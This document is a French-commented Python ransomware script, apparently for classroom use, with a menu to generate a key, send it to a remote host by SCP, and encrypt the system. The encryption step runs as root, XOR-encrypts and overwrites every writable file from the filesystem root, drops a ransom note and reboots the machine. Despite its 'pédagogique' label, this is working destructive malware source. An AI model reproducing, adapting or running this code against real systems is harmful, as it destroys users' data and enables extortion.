# Création d'un script ransomware avec un menu interactif en 3 étapes :
# 1 - Génération de la clé
# 2 - Envoi de la clé via SCP (hôte et utilisateur saisis dynamiquement)
# 3 - Démarrage du chiffrement
#!/usr/bin/env python3
# ⚠️ Script pédagogique de ransomware en environnement isolé

import os
import sys
import base64
import logging
import subprocess

KEY_FILE = "/tmp/ransom_key.txt"
LOG_FILE = "/tmp/ransomware_menu.log"
RANSOM_NOTE = "/root/README.txt"
XOR_KEY = 0xAA

logging.basicConfig(filename=LOG_FILE, level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

def generate_key():
    key = XOR_KEY.to_bytes(1, 'big')
    with open(KEY_FILE, "wb") as f:
        f.write(base64.b64encode(key))
    logging.info("Clé de chiffrement générée et enregistrée dans /tmp.")
    print("[+] Clé générée et stockée dans", KEY_FILE)

def send_key():
    host = input("Entrez l'adresse IP du serveur SSH (ex: 192.168.45.200) : ").strip()
    user = input("Entrez le nom d'utilisateur sur la machine distante : ").strip()
    dest_path = f"{user}@{host}:/home/{user}/key_from_target.txt"

    try:
        subprocess.run(["scp", KEY_FILE, dest_path], check=True)
        logging.info("Clé exfiltrée via SCP.")
        print("[+] Clé envoyée avec succès à", dest_path)
    except Exception as e:
        logging.error(f"Erreur d'exfiltration : {e}")
        print("[-] Échec de l'exfiltration :", e)

def xor_encrypt(data, key):
    return bytes([b ^ key for b in data])

def encrypt_file(path, key):
    try:
        with open(path, "rb") as f:
            data = f.read()
        encrypted = xor_encrypt(data, key)
        encoded = base64.b64encode(encrypted)
        with open(path, "wb") as f:
            f.write(encoded)
        logging.info(f"Fichier chiffré : {path}")
    except Exception as e:
        logging.warning(f"Erreur sur {path} : {e}")

def encrypt_system():
    key = XOR_KEY
    logging.info("Début du chiffrement du système...")
    for root, dirs, files in os.walk("/", topdown=True):
        for name in files:
            path = os.path.join(root, name)
            if os.path.isfile(path) and os.access(path, os.W_OK):
                encrypt_file(path, key)
    print("[✔] Chiffrement terminé.")
    create_ransom_note()
    reboot()

def create_ransom_note():
    try:
        with open(RANSOM_NOTE, "w") as f:
            f.write(
                "----- VOS FICHIERS ONT ÉTÉ CHIFFRÉS -----\\n"
                "Ceci est une simulation pédagogique.\\n"
                "Contactez votre instructeur pour la récupération de la clé.\\n"
            )
        logging.info("Note de rançon écrite.")
    except Exception as e:
        logging.warning(f"Erreur note rançon : {e}")

def reboot():
    logging.info("Redémarrage du système dans 5 secondes...")
    subprocess.run(["sleep", "5"])
    subprocess.run(["reboot"])

def main():
    if os.geteuid() != 0:
        print("[-] Ce script doit être exécuté en tant que root.")
        sys.exit(1)

    while True:
        print("\\n===== MENU RANSOMWARE PÉDAGOGIQUE =====")
        print("1. Générer la clé de chiffrement")
        print("2. Envoyer la clé via SCP")
        print("3. Démarrer le chiffrement du système")
        print("0. Quitter")

        choice = input("Choix : ").strip()

        if choice == "1":
            generate_key()
        elif choice == "2":
            send_key()
        elif choice == "3":
            encrypt_system()
        elif choice == "0":
            print("Sortie du programme.")
            break
        else:
            print("Choix invalide. Veuillez réessayer.")

if __name__ == "__main__":
    main()


